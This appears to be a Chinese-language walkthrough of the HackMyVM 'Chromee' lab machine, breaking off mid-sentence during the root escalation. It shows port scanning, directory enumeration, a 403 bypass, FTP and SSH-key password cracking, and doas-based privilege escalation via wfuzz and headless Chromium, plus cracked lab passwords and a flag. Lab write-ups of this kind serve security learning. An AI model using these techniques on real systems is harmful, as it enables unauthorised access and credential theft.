{"pageProps":{"postData":{"id":"HackMyVMChromee","contentHtml":"<h1>Chromee.</h1>\n<blockquote>\n<p><a href=\"https://hackmyvm.eu/machines/machine.php?vm=Chromee\">https://hackmyvm.eu/machines/machine.php?vm=Chromee</a></p>\n</blockquote>\n<p>Note：<strong>Have fun. :D</strong></p>\n<h2>前期踩点</h2>\n<pre><code class=\"hljs language-bash\">➜  ~  nmap -sP 192.168.56.0/24                    \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-14 11:05 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.1\nHost is up (0.00076s latency).\nMAC Address: 0A:00:27:00:00:09 (Unknown)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.2\nHost is up (0.00067s latency).\nMAC Address: 08:00:27:00:4A:1E (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.43\nHost is up (0.00049s latency).\nMAC Address: 08:00:27:99:F9:89 (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.4\nHost is up.\nNmap <span class=\"hljs-keyword\">done</span>: 256 IP addresses (4 hosts up) scanned <span class=\"hljs-keyword\">in</span> 15.09 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  ~  nmap -sT -min-rate 10000 -p- 192.168.56.43  \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-14 11:06 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.43\nHost is up (0.0015s latency).\nNot shown: 65531 closed tcp ports (conn-refused)\nPORT      STATE SERVICE\n22/tcp    open  ssh\n80/tcp    open  http\n8080/tcp  open  http-proxy\n23333/tcp open  elxmgmt\nMAC Address: 08:00:27:99:F9:89 (Oracle VirtualBox virtual NIC)\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 10.50 seconds\n</code></pre>\n<p><code>23333</code>端口扫出来是<code>vsftp</code></p>\n<pre><code class=\"hljs language-bash\">➜  ~  nmap -sT -A -T4 -O -p 22,80,8080,23333 192.168.56.43\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-14 11:07 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.43\nHost is up (0.00064s latency).\n\nPORT      STATE SERVICE VERSION\n22/tcp    open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)\n| ssh-hostkey: \n|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)\n|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)\n|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)\n80/tcp    open  http    nginx 1.18.0\n|_http-title: primary\n|_http-server-header: nginx/1.18.0\n8080/tcp  open  http    Apache httpd 2.4.56 ((Debian))\n|_http-title: Site doesn<span class=\"hljs-string\">'t have a title (text/html).\n|_http-server-header: Apache/2.4.56 (Debian)\n|_http-open-proxy: Proxy might be redirecting requests\n23333/tcp open  ftp     vsftpd 3.0.3\nMAC Address: 08:00:27:99:F9:89 (Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.8\nNetwork Distance: 1 hop\nService Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.64 ms 192.168.56.43\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 16.87 seconds\n</span></code></pre>\n<pre><code class=\"hljs language-bash\">➜  ~ nmap -script=vuln 22,80,8080,23333 192.168.56.43    \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-14 11:26 EDT\nFailed to resolve <span class=\"hljs-string\">\"22,80,8080,23333\"</span>.\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.43\nHost is up (0.00018s latency).\nNot shown: 997 closed tcp ports (reset)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n|_http-csrf: Couldn<span class=\"hljs-string\">'t find any CSRF vulnerabilities.\n| http-vuln-cve2011-3192: \n|   VULNERABLE:\n|   Apache byterange filter DoS\n|     State: VULNERABLE\n|     IDs:  BID:49303  CVE:CVE-2011-3192\n|       The Apache web server is vulnerable to a denial of service attack when numerous\n|       overlapping byte ranges are requested.\n|     Disclosure date: 2011-08-19\n|     References:\n|       https://www.tenable.com/plugins/nessus/55976\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192\n|       https://www.securityfocus.com/bid/49303\n|_      https://seclists.org/fulldisclosure/2011/Aug/175\n|_http-stored-xss: Couldn'</span>t find any stored XSS vulnerabilities.\n|_http-dombased-xss: Couldn<span class=\"hljs-string\">'t find any DOM based XSS.\n8080/tcp open  http-proxy\nMAC Address: 08:00:27:99:F9:89 (Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 82.11 seconds\n</span></code></pre>\n<h2>vsftpd</h2>\n<p>扫描出了<code>vsftpd</code>，尝试是否允许匿名用户登录</p>\n<pre><code class=\"hljs language-bash\">➜  ~ ftp 192.168.56.43 -p 23333\nConnected to 192.168.56.43.\n220 (vsFTPd 3.0.3)\nName (192.168.56.43:root): anonymous\n331 Please specify the password.\nPassword: \n530 Login incorrect.\nftp: Login failed\n</code></pre>\n<p>不允许，先放着</p>\n<h2>Web 渗透</h2>\n<p>存在 <code>80</code> 和 <code>8080</code> ，优先级 <code>80</code> > <code>8080</code></p>\n<h3>80 端口</h3>\n<p>访问 <code>80</code> 端口</p>\n<p><img src=\"/post-images/HackMyVMChromee/image.png\" alt=\"image.png\"></p>\n<p>扫描一下目录</p>\n<pre><code class=\"hljs language-bash\">➜  Chromee gobuster <span class=\"hljs-built_in\">dir</span> -u http://192.168.56.43:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,zip                                                                          \n\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) &#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.56.43:80\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,txt,html,zip\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster <span class=\"hljs-keyword\">in</span> directory enumeration mode\n===============================================================\n/index.html           (Status: 200) [Size: 4464]\n/post.php             (Status: 200) [Size: 3]\n/secret.php           (Status: 200) [Size: 549]\nProgress: 1102800 / 1102805 (100.00%)\n===============================================================\nFinished\n===============================================================\n</code></pre>\n<p>访问 <code>secret.php</code> 会将其下载下来</p>\n<pre><code class=\"hljs language-bash\">&#x3C;!DOCTYPE html>\n&#x3C;html>\n&#x3C;<span class=\"hljs-built_in\">head</span>>\n    &#x3C;title>Secret&#x3C;/title>\n&#x3C;/head>\n&#x3C;body>\n    &#x3C;?php\n    <span class=\"hljs-variable\">$greeting</span> = <span class=\"hljs-built_in\">date</span>(<span class=\"hljs-string\">'H'</span>) &#x3C; 12 ? <span class=\"hljs-string\">'早上好'</span> : (<span class=\"hljs-built_in\">date</span>(<span class=\"hljs-string\">'H'</span>) &#x3C; 18 ? <span class=\"hljs-string\">'下午好'</span> : <span class=\"hljs-string\">'晚上好'</span>);\n    <span class=\"hljs-variable\">$visitorIP</span> = htmlspecialchars(<span class=\"hljs-variable\">$_SERVER</span>[<span class=\"hljs-string\">'REMOTE_ADDR'</span>]);\n\n    <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"&#x3C;h1>{<span class=\"hljs-variable\">$greeting</span>}，adriana&#x3C;/h1>\"</span>;\n    <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"&#x3C;p>当前时间：\"</span> . <span class=\"hljs-built_in\">date</span>(<span class=\"hljs-string\">'Y-m-d H:i:s'</span>) . <span class=\"hljs-string\">\"&#x3C;/p>\"</span>;\n    <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"&#x3C;p>你的IP：{<span class=\"hljs-variable\">$visitorIP</span>}&#x3C;/p>\"</span>;\n    <span class=\"hljs-keyword\">if</span> (isset(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'aaa'</span>])) {\n    \t<span class=\"hljs-variable\">$file_content</span> = file_get_contents(<span class=\"hljs-string\">'/opt/note/dic.txt'</span>);\n    \t<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$file_content</span>;\n\t} <span class=\"hljs-keyword\">else</span> {\n    \t\tdie();\n\t}\n    ?>\n&#x3C;/body>\n&#x3C;/html>\n\n</code></pre>\n<p>有两个有趣的点，用户名：<code>adriana</code>；传输 <code>aaa</code> 参数的话会回显 <code>/opt/note/dic.txt</code> 的内容。</p>\n<h3>8080 端口</h3>\n<p>访问 <code>8080</code> 端口，提示：<strong>You may need to bypass!</strong></p>\n<p><img src=\"/post-images/HackMyVMChromee/image1.png\" alt=\"image.png\"></p>\n<p>扫描目录</p>\n<pre><code class=\"hljs language-bash\">➜  Chromee gobuster <span class=\"hljs-built_in\">dir</span> -u http://192.168.56.43:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,zip\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) &#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.56.43:8080\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,txt,html,zip\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster <span class=\"hljs-keyword\">in</span> directory enumeration mode\n===============================================================\n/index.html           (Status: 200) [Size: 33]\n/.html                (Status: 403) [Size: 280]\n/javascript           (Status: 301) [Size: 326] [--> http://192.168.56.43:8080/javascript/]\n/silence              (Status: 403) [Size: 280]\n/.html                (Status: 403) [Size: 280]\n/server-status        (Status: 403) [Size: 280]\nProgress: 1102800 / 1102805 (100.00%)\n===============================================================\nFinished\n===============================================================\n</code></pre>\n<p>访问 <code>silence</code></p>\n<p><img src=\"/post-images/HackMyVMChromee/image2.png\" alt=\"image.png\"></p>\n<p>根据提示尝试过绕过该限制</p>\n<p>找到个工具：<a href=\"https://github.com/iamj0ker/bypass-403\">https://github.com/iamj0ker/bypass-403</a></p>\n<pre><code class=\"hljs language-bash\">➜  bypass-403 git:(main) ✗ ./bypass-403.sh http://192.168.56.43:8080/silence | grep 200\n200,616  --> http://192.168.56.43:8080/silence/ -H Content-Length:0 -X POST\n</code></pre>\n<p>通过<code>POST</code>方法即可绕过</p>\n<pre><code class=\"hljs language-bash\">➜  bypass-403 git:(main) ✗ curl http://192.168.56.43:8080/silence/ -H Content-Length:0 -X POST                                                            \n&#x3C;!DOCTYPE html>\n&#x3C;html>\n&#x3C;<span class=\"hljs-built_in\">head</span>>\n  &#x3C;title>Silence&#x3C;/title>\n  &#x3C;style>\n    body {\n      font-family: Arial, sans-serif;\n      text-align: center;\n      margin: 0;\n      padding: 0;\n    }\n\n    .container {\n      display: flex;\n      justify-content: center;\n      align-items: center;\n      height: 100vh;\n    }\n\n    h1 {\n      font-size: 30px;\n    }\n\n    p {\n      font-size: 18px;\n      color: <span class=\"hljs-comment\">#888;</span>\n    }\n  &#x3C;/style>\n&#x3C;/head>\n&#x3C;body>\n  &#x3C;div class=<span class=\"hljs-string\">\"container\"</span>>\n    &#x3C;div>\n      &#x3C;h1>Silence&#x3C;/h1>\n      &#x3C;p>We are working to improve our website.&#x3C;/p>\n      &#x3C;p>contact: support@chromee.hmv&#x3C;/p>\n    &#x3C;/div>\n  &#x3C;/div>\n&#x3C;/body>\n&#x3C;/html>\n</code></pre>\n<p>发现域名 <code>chromee.hmv</code> 将其放到 <code>hosts</code> 文件</p>\n<p>通过域名访问地址</p>\n<p><img src=\"/post-images/HackMyVMChromee/image3.png\" alt=\"image.png\"></p>\n<p>访问之前的<code>secret.php</code></p>\n<p><img src=\"/post-images/HackMyVMChromee/image4.png\" alt=\"image.png\"></p>\n<p>添加参数 <code>aaa</code> ，以获得 <code>/opt/note/dic.txt</code> 文件内容</p>\n<p><img src=\"/post-images/HackMyVMChromee/image5.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">The Lost Key Lily, a curious girl, found an old rusty key <span class=\"hljs-keyword\">in</span> the woods. Wondering <span class=\"hljs-built_in\">where</span> it belonged, she asked everyone <span class=\"hljs-keyword\">in</span> the village, but no one knew. One day, she discovered a locked stone well. To her surprise, the key fit. She opened it and descended into a hidden passage. There, she found an ancient chest filled with treasures. But the real treasure was a note inside: “The greatest treasure is the journey, not the prize.” Lily smiled, realizing the adventure was the real reward.\n</code></pre>\n<h2>FTP 爆破 &#x26; 信息收集</h2>\n<h3>爆破</h3>\n<p>根据文件名应该是一个字典文件，并且也拿到了用户名<code>adriana</code> ，应该是要我们对哪里进行爆破，比如 <code>FTP</code></p>\n<p>现在对字典做处理</p>\n<p>在尝试了使用<code>cewl</code> + <code>john</code> 生成的字典无果后，尝试使用<code>cupp</code> （根据人名生成字典）</p>\n<pre><code class=\"hljs language-bash\">➜  cupp git:(master) python cupp.py -i\n ___________ \n   cupp.py!                 <span class=\"hljs-comment\"># Common</span>\n      \\                     <span class=\"hljs-comment\"># User</span>\n       \\   ,__,             <span class=\"hljs-comment\"># Passwords</span>\n        \\  (oo)____         <span class=\"hljs-comment\"># Profiler</span>\n           (__)    )\\   \n              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]\n                            [ Mebus | https://github.com/Mebus/]\n\n[+] Insert the information about the victim to make a dictionary\n[+] If you don<span class=\"hljs-string\">'t know all the info, just hit enter when asked! ;)\n\n> First Name: adriana\n> Surname: Lily\n> Nickname: \n> Birthdate (DDMMYYYY): \n\n> Partners) name: \n> Partners) nickname: \n> Partners) birthdate (DDMMYYYY): \n\n> Child'</span>s name: \n> Child<span class=\"hljs-string\">'s nickname: \n> Child'</span>s birthdate (DDMMYYYY): \n\n> Pet<span class=\"hljs-string\">'s name: \n> Company name: \n...\n**[+] Now load your pistolero with adriana.txt** and shoot! Good luck!                                                                                                                                              \n</span></code></pre>\n<p>九头蛇爆破，得到密码 <code>Lily2020</code></p>\n<pre><code class=\"hljs language-bash\">➜  Chromee hydra -l adriana -P cupp/adriana.txt -Vv -t 12 ftp://192.168.56.43:23333\n[23333][ftp] host: 192.168.56.43   login: adriana   password: Lily2020\n[STATUS] attack finished <span class=\"hljs-keyword\">for</span> 192.168.56.43 (waiting <span class=\"hljs-keyword\">for</span> children to complete tests)\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-04-14 22:40:53\n</code></pre>\n<h3>信息收集</h3>\n<p>使用<code>FTP</code>进行连接</p>\n<ul>\n<li>\n<p>可以找到有两个用户</p>\n<pre><code class=\"hljs language-bash\">ftp> <span class=\"hljs-built_in\">cd</span> home\n250 Directory successfully changed.\nftp> <span class=\"hljs-built_in\">ls</span>\n229 Entering Extended Passive Mode (|||64841|)\n150 Here comes the directory listing.\ndrwxr-x---    4 1000     1000         4096 Mar 09 08:59 follower\ndrwxr-x---    3 1001     1001         4096 Mar 07 13:39 softly\n</code></pre>\n</li>\n<li>\n<p><code>/srv</code> 下还能找到 <code>zeus.conf</code> 下载下来</p>\n<pre><code class=\"hljs language-bash\">ftp> <span class=\"hljs-built_in\">cd</span> srv                                                                                             \n250 Directory successfully changed.                                                                     \nftp> <span class=\"hljs-built_in\">ls</span>                                                                                                 \n229 Entering Extended Passive Mode (|||61786|)                                                          \n150 Here comes the directory listing. \ndrwxr-xr-x    2 0        115          4096 Mar 07 04:08 ftp           \n-rw-r--r--    1 0        0             153 Mar 09 09:20 zeus.conf                              \n</code></pre>\n<pre><code class=\"hljs language-swift\"><span class=\"hljs-operator\">➜</span><span class=\"hljs-type\">Chromee</span> cat zeus.conf\npermit follower <span class=\"hljs-keyword\">as</span> softly cmd <span class=\"hljs-regexp\">/usr/</span>local<span class=\"hljs-regexp\">/bin/</span>wfuzz\npermit nopass :softly <span class=\"hljs-keyword\">as</span> root cmd <span class=\"hljs-regexp\">/usr/</span>bin<span class=\"hljs-operator\">/</span>chromium\npermit nopass :softly <span class=\"hljs-keyword\">as</span> root cmd <span class=\"hljs-regexp\">/usr/</span>bin<span class=\"hljs-operator\">/</span>kill\n</code></pre>\n<p>1️⃣ <code>permit follower as softly cmd /usr/local/bin/wfuzz</code></p>\n<p>→ 允许用户 <code>follower</code>，以用户 <code>softly</code> 的身份运行 <code>/usr/local/bin/wfuzz</code>。</p>\n<p>2️⃣ <code>permit nopass :softly as root cmd /usr/bin/chromium</code></p>\n<p>→ 允许 <code>softly</code> 用户无密码，提权为 <code>root</code> 执行 <code>/usr/bin/chromium</code>。</p>\n<p>3️⃣ <code>permit nopass :softly as root cmd /usr/bin/kill</code></p>\n<p>→ 允许 <code>softly</code> 用户无密码，提权为 <code>root</code> 执行 <code>/usr/bin/kill</code>。</p>\n<p>那么我们应该是要先拿到<code>follower</code>用户</p>\n</li>\n<li>\n<p><code>/opt/note</code> 下发现隐藏文件 <code>…</code></p>\n<pre><code class=\"hljs language-bash\">ftp> <span class=\"hljs-built_in\">cd</span> /opt/note\n250 Directory successfully changed.\nftp> <span class=\"hljs-built_in\">ls</span> -al\n229 Entering Extended Passive Mode (|||59165|)\n150 Here comes the directory listing.\ndrwxr-xr-x    2 106      115          4096 Mar 09 09:13 .\ndrwxr-xr-x    4 0        0            4096 Mar 09 09:12 ..\n-rw-r--r--    1 0        0            3414 Mar 09 09:13 ...\n-rw-r--r--    1 0        0             495 Mar 07 15:40 dic.txt\n226 Directory send OK.\n</code></pre>\n<p>是<code>SSH</code>私钥</p>\n<pre><code class=\"hljs language-bash\">➜  Chromee file <span class=\"hljs-string\">'...'</span>\n...: OpenSSH private key\n</code></pre>\n<p>因为我们是要先拿到 <code>follower</code>用户，所以私钥应该是<code>follower</code>用户的</p>\n<pre><code class=\"hljs language-bash\">➜  Chromee ssh follower@192.168.56.43 -i <span class=\"hljs-string\">'...'</span>\nEnter passphrase <span class=\"hljs-keyword\">for</span> key <span class=\"hljs-string\">'...'</span>: \n</code></pre>\n<p>需要密码，进行爆破</p>\n<pre><code class=\"hljs language-bash\">➜  Chromee ssh2john <span class=\"hljs-string\">'...'</span> > sshkey     \n                             \n➜  Chromee john --wordlist=/usr/share/wordlists/rockyou.txt sshkey               \nUsing default input encoding: UTF-8\nLoaded 1 password <span class=\"hljs-built_in\">hash</span> (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])\nCost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 <span class=\"hljs-keyword\">for</span> all loaded hashes\nCost 2 (iteration count) is 24 <span class=\"hljs-keyword\">for</span> all loaded hashes\nWill run 16 OpenMP threads\nPress <span class=\"hljs-string\">'q'</span> or Ctrl-C to abort, almost any other key <span class=\"hljs-keyword\">for</span> status\ncassandra        (...)     \n1g 0:00:00:25 DONE (2025-04-14 23:08) 0.03880g/s 39.73p/s 39.73c/s 39.73C/s johnson..cutie1\nUse the <span class=\"hljs-string\">\"--show\"</span> option to display all of the cracked passwords reliably\n</code></pre>\n<p>得到密码<code>cassandra</code></p>\n<pre><code class=\"hljs language-bash\">➜  Chromee ssh softly@192.168.56.43 -i <span class=\"hljs-string\">'...'</span>   \nsoftly@192.168.56.43: Permission denied (publickey).\n</code></pre>\n<p>成功登陆</p>\n<pre><code class=\"hljs language-bash\">➜  Chromee ssh follower@192.168.56.43 -i <span class=\"hljs-string\">'...'</span>\nEnter passphrase <span class=\"hljs-keyword\">for</span> key <span class=\"hljs-string\">'...'</span>: \nfollower@Chromee:~$ \n</code></pre>\n</li>\n</ul>\n<h2>提权</h2>\n<h3>To softly</h3>\n<p>上面找到的，貌似是<code>doas</code>的配置文件，<code>dosa</code>可以以其他用户执行命令</p>\n<pre><code class=\"hljs language-swift\"><span class=\"hljs-operator\">➜</span><span class=\"hljs-type\">Chromee</span> cat zeus.conf\npermit follower <span class=\"hljs-keyword\">as</span> softly cmd <span class=\"hljs-regexp\">/usr/</span>local<span class=\"hljs-regexp\">/bin/</span>wfuzz\npermit nopass :softly <span class=\"hljs-keyword\">as</span> root cmd <span class=\"hljs-regexp\">/usr/</span>bin<span class=\"hljs-operator\">/</span>chromium\npermit nopass :softly <span class=\"hljs-keyword\">as</span> root cmd <span class=\"hljs-regexp\">/usr/</span>bin<span class=\"hljs-operator\">/</span>kill\n</code></pre>\n<p>1️⃣ <code>permit follower as softly cmd /usr/local/bin/wfuzz</code></p>\n<p>→ 允许用户 <code>follower</code>，以用户 <code>softly</code> 的身份运行 <code>/usr/local/bin/wfuzz</code>。</p>\n<p>2️⃣ <code>permit nopass :softly as root cmd /usr/bin/chromium</code></p>\n<p>→ 允许 <code>softly</code> 用户无密码，提权为 <code>root</code> 执行 <code>/usr/bin/chromium</code>。</p>\n<p>3️⃣ <code>permit nopass :softly as root cmd /usr/bin/kill</code></p>\n<p>→ 允许 <code>softly</code> 用户无密码，提权为 <code>root</code> 执行 <code>/usr/bin/kill</code>。</p>\n<p>允许<code>follower</code>，以用户 <code>softly</code> 的身份运行 <code>/usr/local/bin/wfuzz</code></p>\n<p>尝试使用，输入<code>cassandra</code> 但是认证失败了，现在目标应该是<code>follower</code>的密码</p>\n<pre><code class=\"hljs language-bash\">follower@Chromee:~$ doas -u softly /usr/local/bin/wfuzz\nPassword: \ndoas: authentication failed\n</code></pre>\n<p>家目录下能找到</p>\n<pre><code class=\"hljs language-bash\">follower@Chromee:~$ <span class=\"hljs-built_in\">ls</span>\ncat.gif  note.txt\n</code></pre>\n<p><code>note.txt</code></p>\n<pre><code class=\"hljs language-bash\">follower@Chromee:~$ <span class=\"hljs-built_in\">cat</span> note.txt \nThink about rotations and the <span class=\"hljs-built_in\">cat</span>’s secrets.\n\n47 is not just a number, it<span class=\"hljs-string\">'s a twist of fate.\n</span></code></pre>\n<p>旋转和猫？oiiaioiiiai ；47指的应该是 <code>rot47</code></p>\n<p><code>cat.gif</code> 群主的修猫</p>\n<p><img src=\"/post-images/HackMyVMChromee/image6.png\" alt=\"image.png\"></p>\n<p>应该是图片隐写了</p>\n<p>因为<code>gif</code>是多帧的，我们查看每一帧时间</p>\n<pre><code class=\"hljs language-bash\">➜  Chromee identify -format <span class=\"hljs-string\">\"%T \"</span> cat.gif\n65 98 65 100 102 98 67 6 6 6 6 6 6 <span class=\"hljs-comment\">#   </span>\n</code></pre>\n<p>前面的帧数很奇怪不像后面稳定的帧</p>\n<p>提权前面的帧去进行<code>rot47</code>解密，得到密码<code>p3p573r</code></p>\n<p><img src=\"/post-images/HackMyVMChromee/image7.png\" alt=\"image.png\"></p>\n<p>再次执行</p>\n<pre><code class=\"hljs language-bash\">follower@Chromee:~$ doas -u softly /usr/local/bin/wfuzz\nPassword: \n /usr/local/lib/python3.9/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class=\"hljs-string\">'s documentation for more information.\n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n*                                                      *\n* Version up to 1.4c coded by:                         *\n* Christian Martorella (cmartorella@edge-security.com) *\n* Carlos del ojo (deepbit@gmail.com)                   *\n*                                                      *\n* Version 1.4d to 3.1.0 coded by:                      *\n* Xavier Mendez (xmendez@edge-security.com)            *\n********************************************************\n\nUsage:  wfuzz [options] -z payload,params &#x3C;url>\n\n        FUZZ, ..., FUZnZ  wherever you put these keywords wfuzz will replace them with the values of the specified payload.\n        FUZZ{baseline_value} FUZZ will be replaced by baseline_value. It will be the first request performed and could be used as a base for filtering.\n\nExamples:\n        wfuzz -c -z file,users.txt -z file,pass.txt --sc 200 http://www.site.com/log.asp?user=FUZZ&#x26;pass=FUZ2Z\n        wfuzz -c -z range,1-10 --hc=BBB http://www.site.com/FUZZ{something not there}\n        wfuzz --script=robots -z list,robots.txt http://www.webscantest.com/FUZZ\n\nType wfuzz -h for further information or --help for advanced usage.\n</span></code></pre>\n<p>尝试使用 <code>-w</code> 读取<code>softly</code>的私钥</p>\n<pre><code class=\"hljs language-bash\">follower@Chromee:~$ doas -u softly /usr/local/bin/wfuzz -u 127.0.0.1 -w /home/softly/.ssh/id_rsa\nPassword: \n /usr/local/lib/python3.9/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class=\"hljs-string\">'s documentation for more information.\n softly@Chromee:/home/follower$\n</span></code></pre>\n<p>却意外直接获得了<code>softly</code>用户的<code>shell</code></p>\n<h3>To root</h3>\n<p>在家目录可以看到 <code>user.txt</code></p>\n<pre><code class=\"hljs language-bash\">softly@Chromee:~$ <span class=\"hljs-built_in\">cat</span>  user.txt\nflag{c5dbe81aac6438c522d2f79cc7255e6a}\n</code></pre>\n<p>写入公钥，方便后面登录</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"ssh-rsa xxxxxx\"</span> > .ssh/authorized_keys\n</code></pre>\n<p>通过前面我们能知道<code>softly</code>可以以<code>root</code>用户执行：</p>\n<p>2️⃣ <code>permit nopass :softly as root cmd /usr/bin/chromium</code></p>\n<p>→ 允许 <code>softly</code> 用户无密码，提权为 <code>root</code> 执行 <code>/usr/bin/chromium</code>。</p>\n<p>3️⃣ <code>permit nopass :softly as root cmd /usr/bin/kill</code></p>\n<p>→ 允许 <code>softly</code> 用户无密码，提权为 <code>root</code> 执行 <code>/usr/bin/kill</code>。</p>\n<p>尝试运行<code>/usr/bin/chromium</code></p>\n<pre><code class=\"hljs language-bash\">softly@Chromee:~$ doas -u root /usr/bin/chromium --no-sandbox\n[10526:10526:0415/095434.491167:ERROR:process_singleton_posix.cc(353)] The profile appears to be <span class=\"hljs-keyword\">in</span> use by another Chromium process (6169) on another computer (pepster). Chromium has locked the profile so that it doesn<span class=\"hljs-string\">'t get corrupted. If you are sure no other processes are using this profile, you can unlock the profile and relaunch Chromium.\n[10526:10526:0415/095434.492377:ERROR:message_box_dialog.cc(146)] Unable to show a dialog outside the UI thread message loop: Chromium - The profile appears to be in use by another Chromium process (6169) on another computer (pepster). Chromium has locked the profile so that it doesn'</span>t get corrupted. If you are sure no other processes are using this profile, you can unlock the profile and relaunch Chromium.\n</code></pre>\n<p>可能是因为靶机上无<code>GUI</code>报的错，通过资料开启无头模式和远程调用</p>\n<pre><code class=\"hljs language-bash\">softly@Chromee:/$ doas /usr/bin/chromium --headless --remote-debugging-port=9222 --no-sandbox &#x26;\n\nDevTools listening on ws://127.0.0.1:9222/devtools/browser/165f92a5-e162-4f6b-a283-2e4b4a875abf\n[0415/103414.852554:WARNING:bluez_dbus_manager.cc(248)] Floss manager not present, cannot <span class=\"hljs-built_in\">set</span> Floss <span class=\"hljs-built_in\">enable</span>/disable.\n[0415/103414.872625:ERROR:angle_platform_impl.cc(44)] Display.cpp:1052 (initialize): ANGLE Display::initialize error 12289: Could not open the default X display.\nERR: Display.cpp:1052 (initialize): ANGLE Display::initialize error 12289: Could not open the default X display.\n[0415/103414.873142:ERROR:gl_display.cc(515)] EGL Driver message (Critical) eglInitialize: Could not open the default X display.\n[0415/103414.874323:ERROR:gl_display.cc(786)] eglInitialize Default failed with error EGL_NOT_INITIALIZED\n[0415/103414.874594:ERROR:gl_display.cc(820)] Initialization of all EGL display types failed.\n[0415/103414.874732:ERROR:gl_ozone_egl.cc(26)] GLDisplayEGL::Initialize failed.\n[0415/103414.875005:ERROR:angle_platform_impl.cc(44)] Display.cpp:1052 (initialize): ANGLE Display::initialize error 12289: Could not open the default X display.\nERR: Display.cpp:1052 (initialize): ANGLE Display::initialize error 12289: Could not open the default X display.\n[0415/103414.875188:ERROR:gl_display.cc(515)] EGL Driver message (Critical) eglInitialize: Could not open the default X display.\n[0415/103414.875244:ERROR:gl_display.cc(786)] eglInitialize Default failed with error EGL_NOT_INITIALIZED\n[0415/103414.875360:ERROR:gl_display.cc(820)] Initialization of all EGL display types failed.\n[0415/103414.875466:ERROR:gl_ozone_egl.cc(26)] GLDisplayEGL::Initialize failed.\n[0415/103414.890126:ERROR:viz_main_impl.cc(196)] Exiting GPU process due to errors during initialization\n</code></pre>\n<p>在本地上启动了 <code>9222</code> 端口</p>\n<pre><code class=\"hljs language-bash\">softly@Chromee:~$ ss -tulpn\nNetid    State     Recv-Q    Send-Q         Local Address:Port          Peer Address:Port    Process    \nudp      UNCONN    0         0                    0.0.0.0:68                 0.0.0.0:*                  \ntcp      LISTEN    0         10                 127.0.0.1:9222               0.0.0.0:*                  \ntcp      LISTEN    0         511                  0.0.0.0:80                 0.0.0.0:*                  \ntcp      LISTEN    0         128                  0.0.0.0:22                 0.0.0.0:*                  \ntcp      LISTEN    0         32                         *:23333                    *:*                  \ntcp      LISTEN    0         511                     [::]:80                    [::]:*                  \ntcp      LISTEN    0         511                        *:8080                     *:*                  \ntcp      LISTEN    0         128                     [::]:22                    [::]:* \n</code></pre>\n<p>使用 